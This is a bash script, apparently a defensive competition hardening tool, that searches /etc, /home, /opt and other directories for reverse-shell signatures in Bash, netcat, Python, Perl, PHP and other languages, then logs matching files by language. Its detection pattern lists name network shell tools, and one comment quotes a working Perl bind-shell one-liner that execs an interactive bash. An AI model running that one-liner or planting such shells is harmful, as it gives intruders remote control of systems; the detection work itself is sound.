#!/bin/bash

# https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

# for finding all the shells
grep -Erw "sh -i|/dev/tcp/|0>&1|sh -l|sh -c|bash -i|bash -l|bash -c|socat|exec:|EXEC:|nc -l|nc -v|nc -n|nc -p|nc -e|nc -c|mkfifo|ncat|telnet|BEGIN \{|/inet/tcp/|& getline c|close\(c\)|import socket|socket.socket|os.dup|pty.spawn|subprocess.call|s.fileno()|AF_INET|use Socket|SOCK_STREAM|getprotobyname|exec\(\"/bin\)|\(fork|PF_INET|fdopen|system\$_|TCPSocket|exec sprintf|c.gets.chomp|IO.popen|fsockopen\(|system\(|passthru\(|popen\(|shell_exec\(|dup2\(|execve\(|getInputStream|ProcessBuilder|getRuntime|net.Dial\(|exec.Command|cmd.Run\(" /etc /home /root /opt /usr /var 2> /dev/null | grep -Ev "#|thing-main|vim|python|perl" >> /opt/thing-main/output/allshellsdestroyed.txt

# individual shells
echo "Bash" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "sh -i|/dev/tcp/|0>&1|sh -l|sh -c|bash -i|bash -l|bash -c" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

echo -e "\nNetcat,Ncat,Socat" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "socat|exec:|EXEC:|nc -l|nc -v|nc -n|nc -p|nc -e|nc -c|mkfifo|ncat" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

echo -e "\nTelnet" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "telnet" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

echo -e "\nAwk" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "BEGIN \{|/inet/tcp/|& getline c|close\(c\)" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

echo -e "\nPython" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "import socket|socket.socket|os.dup|pty.spawn|subprocess.call|s.fileno()|AF_INET" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

# cypat used this before to turn process name into [loop], use Socket;$0="[loop]";if(fork){exit;}; $p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S); close C){if(!form){open(STDIN,">&C");open(STDERR,">&C");exec("/bin/bash -i");};};
echo -e "\nPerl" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "use Socket|SOCK_STREAM|getprotobyname|exec\(\"/bin\)|\(fork|PF_INET|fdopen|system\$_" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

echo -e "\nRuby" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "TCPSocket|exec sprintf|c.gets.chomp|IO.popen" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

echo -e "\nPHP" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "fsockopen\(|system\(|passthru\(|popen\(|shell_exec\(" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

echo -e "\nC" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "dup2\(|execve\(" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

echo -e "\nJava" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "getInputStream|ProcessBuilder|getRuntime" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt

echo -e "\nGolang" >> /opt/thing-main/output/shellsdestroyed.txt

grep -E "net.Dial\(|exec.Command|cmd.Run\(" /opt/thing-main/output/allshellsdestroyed.txt | cut -d ":" -f1 | sort -u >> /opt/thing-main/output/shellsdestroyed.txt
